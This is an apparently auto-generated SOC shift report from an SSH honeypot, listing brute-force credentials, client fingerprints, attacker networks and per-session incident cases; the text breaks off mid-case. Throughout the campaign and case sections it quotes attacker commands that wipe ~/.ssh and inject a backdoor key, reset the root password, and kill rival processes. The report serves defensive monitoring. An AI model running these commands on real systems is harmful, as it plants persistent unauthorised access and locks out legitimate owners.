# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T07:11:37Z |
| **Shift Time** | 07:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **164** |
| Confirmed Threats | **162** |
| False Positives Filtered | **2** (1.2%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **9** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **98** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **125** |
| Unique Credential Pairs | **57** |
| Unique Usernames | **22** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 31 |
| `deploy` | 4 |
| `ubuntu` | 3 |
| `vijay` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 31 |
| `3245gs5662d34` | 31 |
| `q1w2e3r4t5` | 2 |
| `Aa.12345` | 2 |
| `root11111!@#` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 31 |
| `root` | `3245gs5662d34` | 31 |
| `deploy` | `q1w2e3r4t5` | 2 |
| `root` | `Aa.12345` | 2 |
| `root` | `root11111!@#` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root654321..` | `197.153.57.103` | 2026-04-12T05:53:00 |
| `root` | `3245gs5662d34` | `197.153.57.103` | 2026-04-12T05:53:05 |
| `root` | `PA$$w0rd` | `197.153.57.103` | 2026-04-12T05:53:38 |
| `root` | `Aa.12345` | `79.45.101.239` | 2026-04-12T05:54:46 |
| `root` | `3245gs5662d34` | `79.45.101.239` | 2026-04-12T05:54:49 |
| `root` | `12345_qwer` | `197.153.57.103` | 2026-04-12T05:55:26 |
| `root` | `root11111!@#` | `102.210.148.92` | 2026-04-12T05:55:32 |
| `root` | `3245gs5662d34` | `102.210.148.92` | 2026-04-12T05:55:36 |
| `root` | `System1234` | `197.153.57.103` | 2026-04-12T05:56:52 |
| `root` | `1qaz2wsx3edc!@#` | `197.153.57.103` | 2026-04-12T05:57:32 |
| `root` | `123454321` | `79.45.101.239` | 2026-04-12T05:57:43 |
| `root` | `Qwerty1!` | `102.210.148.92` | 2026-04-12T05:59:17 |
| `root` | `Aa666666` | `197.153.57.103` | 2026-04-12T05:59:26 |
| `root` | `BBzz123123` | `101.126.11.137` | 2026-04-12T05:59:33 |
| `root` | `Qf123456.` | `79.45.101.239` | 2026-04-12T06:00:39 |
| `root` | `Qaz112233` | `102.210.148.92` | 2026-04-12T06:01:04 |
| `root` | `Root12#` | `197.153.57.103` | 2026-04-12T06:02:07 |
| `root` | `root11111!@#` | `79.45.101.239` | 2026-04-12T06:02:10 |
| `root` | `unix` | `197.153.57.103` | 2026-04-12T06:02:48 |
| `root` | `1q@W#E$R` | `197.153.57.103` | 2026-04-12T06:03:28 |
| `root` | `A123456B123456` | `79.45.101.239` | 2026-04-12T06:03:44 |
| `root` | `Aa.12345` | `102.210.148.92` | 2026-04-12T06:06:37 |
| `root` | `qazwsx0000#` | `102.210.148.92` | 2026-04-12T06:08:30 |
| `root` | `frappe` | `102.210.148.92` | 2026-04-12T06:12:24 |
| `root` | `A1234567890B` | `14.103.131.112` | 2026-04-12T06:13:58 |
| `root` | `test!@#123` | `23.88.103.45` | 2026-04-12T06:14:22 |
| `root` | `3245gs5662d34` | `23.88.103.45` | 2026-04-12T06:14:26 |
| `root` | `qazwsx001$` | `103.186.1.59` | 2026-04-12T06:16:00 |
| `root` | `3245gs5662d34` | `103.186.1.59` | 2026-04-12T06:16:05 |
| `root` | `admin_888` | `102.210.148.92` | 2026-04-12T06:17:58 |
| `root` | `A123456B123456` | `102.210.148.92` | 2026-04-12T06:19:46 |
| `root` | `qwertyu12345` | `222.71.205.34` | 2026-04-12T06:21:59 |
| `root` | `3245gs5662d34` | `222.71.205.34` | 2026-04-12T06:22:07 |
| `root` | `Qaz@12345` | `222.71.205.34` | 2026-04-12T06:22:34 |
| `root` | `password123!` | `102.210.148.92` | 2026-04-12T06:23:31 |
| `root` | `Root#2026` | `222.71.205.34` | 2026-04-12T06:24:53 |
| `root` | `Qf123456.` | `102.210.148.92` | 2026-04-12T06:25:29 |
| `root` | `1qaz@2WSX` | `222.71.205.34` | 2026-04-12T06:25:59 |
| `root` | `123454321` | `102.210.148.92` | 2026-04-12T06:27:27 |
| `root` | `123456.ZXCV` | `102.210.148.92` | 2026-04-12T06:31:21 |
| `root` | `a1234567@` | `102.210.148.92` | 2026-04-12T06:36:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **164** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 158 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 153 | 8 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 153 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wcZmlhDrXPnJ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `222.71.205.34`, `101.126.11.137`, `14.103.131.112`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.210.148.92`, `23.88.103.45`, `197.153.57.103`, `103.186.1.59`, `79.45.101.239`, `222.71.205.34`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4812` | China Telecom (Group) | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS3269` | Telecom Italia S.p.A. | 1 | HIGH |
| `AS24940` | Hetzner Online GmbH | 1 | HIGH |
| `AS36925` | MEDITELECOM | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d34d18222178

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:52 |
| **Last Seen** | 2026-04-12 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:52:59` | `cowrie.session.connect` |
| `2026-04-12 05:52:59` | `cowrie.client.version` |
| `2026-04-12 05:52:59` | `cowrie.client.kex` |
| `2026-04-12 05:53:00` | `cowrie.login.success` |
| `2026-04-12 05:53:01` | `cowrie.session.params` |
| `2026-04-12 05:53:01` | `cowrie.command.input` |
| `2026-04-12 05:53:01` | `cowrie.command.failed` |
| `2026-04-12 05:53:01` | `cowrie.log.closed` |
| `2026-04-12 05:53:01` | `cowrie.session.params` |
| `2026-04-12 05:53:01` | `cowrie.command.input` |
| `2026-04-12 05:53:01` | `cowrie.session.file_download` |
| `2026-04-12 05:53:01` | `cowrie.log.closed` |
| `2026-04-12 05:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae17afe8fe7c

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:53 |
| **Last Seen** | 2026-04-12 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:53:04` | `cowrie.session.connect` |
| `2026-04-12 05:53:04` | `cowrie.client.version` |
| `2026-04-12 05:53:04` | `cowrie.client.kex` |
| `2026-04-12 05:53:05` | `cowrie.login.success` |
| `2026-04-12 05:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af818695a182

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:53 |
| **Last Seen** | 2026-04-12 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:53:37` | `cowrie.session.connect` |
| `2026-04-12 05:53:37` | `cowrie.client.version` |
| `2026-04-12 05:53:37` | `cowrie.client.kex` |
| `2026-04-12 05:53:38` | `cowrie.login.success` |
| `2026-04-12 05:53:38` | `cowrie.session.params` |
| `2026-04-12 05:53:38` | `cowrie.command.input` |
| `2026-04-12 05:53:38` | `cowrie.command.failed` |
| `2026-04-12 05:53:38` | `cowrie.log.closed` |
| `2026-04-12 05:53:39` | `cowrie.session.params` |
| `2026-04-12 05:53:39` | `cowrie.command.input` |
| `2026-04-12 05:53:39` | `cowrie.session.file_download` |
| `2026-04-12 05:53:39` | `cowrie.log.closed` |
| `2026-04-12 05:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739afe7e1afb

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:53 |
| **Last Seen** | 2026-04-12 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:53:42` | `cowrie.session.connect` |
| `2026-04-12 05:53:42` | `cowrie.client.version` |
| `2026-04-12 05:53:42` | `cowrie.client.kex` |
| `2026-04-12 05:53:43` | `cowrie.login.success` |
| `2026-04-12 05:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed45500b0de0

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 05:54 |
| **Last Seen** | 2026-04-12 05:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:54:45` | `cowrie.session.connect` |
| `2026-04-12 05:54:45` | `cowrie.client.version` |
| `2026-04-12 05:54:45` | `cowrie.client.kex` |
| `2026-04-12 05:54:46` | `cowrie.login.success` |
| `2026-04-12 05:54:46` | `cowrie.session.params` |
| `2026-04-12 05:54:46` | `cowrie.command.input` |
| `2026-04-12 05:54:46` | `cowrie.command.failed` |
| `2026-04-12 05:54:46` | `cowrie.log.closed` |
| `2026-04-12 05:54:46` | `cowrie.session.params` |
| `2026-04-12 05:54:46` | `cowrie.command.input` |
| `2026-04-12 05:54:47` | `cowrie.session.file_download` |
| `2026-04-12 05:54:47` | `cowrie.log.closed` |
| `2026-04-12 05:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d6ac89a3cf8

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 05:54 |
| **Last Seen** | 2026-04-12 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:54:49` | `cowrie.session.connect` |
| `2026-04-12 05:54:49` | `cowrie.client.version` |
| `2026-04-12 05:54:49` | `cowrie.client.kex` |
| `2026-04-12 05:54:49` | `cowrie.login.success` |
| `2026-04-12 05:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d599b0cf6a67

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:55 |
| **Last Seen** | 2026-04-12 05:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:55:25` | `cowrie.session.connect` |
| `2026-04-12 05:55:25` | `cowrie.client.version` |
| `2026-04-12 05:55:26` | `cowrie.client.kex` |
| `2026-04-12 05:55:26` | `cowrie.login.success` |
| `2026-04-12 05:55:27` | `cowrie.session.params` |
| `2026-04-12 05:55:27` | `cowrie.command.input` |
| `2026-04-12 05:55:27` | `cowrie.command.failed` |
| `2026-04-12 05:55:27` | `cowrie.log.closed` |
| `2026-04-12 05:55:27` | `cowrie.session.params` |
| `2026-04-12 05:55:27` | `cowrie.command.input` |
| `2026-04-12 05:55:28` | `cowrie.session.file_download` |
| `2026-04-12 05:55:28` | `cowrie.log.closed` |
| `2026-04-12 05:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce989e607a7

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:55 |
| **Last Seen** | 2026-04-12 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:55:30` | `cowrie.session.connect` |
| `2026-04-12 05:55:30` | `cowrie.client.version` |
| `2026-04-12 05:55:30` | `cowrie.client.kex` |
| `2026-04-12 05:55:31` | `cowrie.login.success` |
| `2026-04-12 05:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72adb713bf05

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 05:55 |
| **Last Seen** | 2026-04-12 05:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:55:31` | `cowrie.session.connect` |
| `2026-04-12 05:55:31` | `cowrie.client.version` |
| `2026-04-12 05:55:31` | `cowrie.client.kex` |
| `2026-04-12 05:55:32` | `cowrie.login.success` |
| `2026-04-12 05:55:32` | `cowrie.session.params` |
| `2026-04-12 05:55:32` | `cowrie.command.input` |
| `2026-04-12 05:55:32` | `cowrie.command.failed` |
| `2026-04-12 05:55:32` | `cowrie.log.closed` |
| `2026-04-12 05:55:33` | `cowrie.session.params` |
| `2026-04-12 05:55:33` | `cowrie.command.input` |
| `2026-04-12 05:55:33` | `cowrie.session.file_download` |
| `2026-04-12 05:55:33` | `cowrie.log.closed` |
| `2026-04-12 05:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eaae90553cc

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 05:55 |
| **Last Seen** | 2026-04-12 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:55:35` | `cowrie.session.connect` |
| `2026-04-12 05:55:35` | `cowrie.client.version` |
| `2026-04-12 05:55:35` | `cowrie.client.kex` |
| `2026-04-12 05:55:36` | `cowrie.login.success` |
| `2026-04-12 05:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f731cfac1f5b

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:56 |
| **Last Seen** | 2026-04-12 05:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:56:51` | `cowrie.session.connect` |
| `2026-04-12 05:56:51` | `cowrie.client.version` |
| `2026-04-12 05:56:52` | `cowrie.client.kex` |
| `2026-04-12 05:56:52` | `cowrie.login.success` |
| `2026-04-12 05:56:53` | `cowrie.session.params` |
| `2026-04-12 05:56:53` | `cowrie.command.input` |
| `2026-04-12 05:56:53` | `cowrie.command.failed` |
| `2026-04-12 05:56:53` | `cowrie.log.closed` |
| `2026-04-12 05:56:54` | `cowrie.session.params` |
| `2026-04-12 05:56:54` | `cowrie.command.input` |
| `2026-04-12 05:56:54` | `cowrie.session.file_download` |
| `2026-04-12 05:56:54` | `cowrie.log.closed` |
| `2026-04-12 05:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
